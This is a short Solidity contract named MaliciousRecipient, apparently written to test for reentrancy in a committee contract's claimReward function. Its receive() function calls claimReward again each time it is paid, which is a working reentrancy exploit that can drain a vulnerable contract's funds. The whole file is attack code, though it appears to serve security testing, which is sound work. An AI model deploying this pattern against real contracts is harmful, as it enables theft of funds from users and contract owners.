// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface ICommittee {
    function claimReward(uint256 _proposalId) external;
}
contract MaliciousRecipient {
    ICommittee public immutable committee;
    uint256 public immutable proposalId;
    constructor(address _committee, uint256 _proposalId) payable {
        committee = ICommittee(_committee);
        proposalId = _proposalId;
    }
    function attack() external {
        committee.claimReward(proposalId);
    }
    receive() external payable {
        committee.claimReward(proposalId);
    }
}
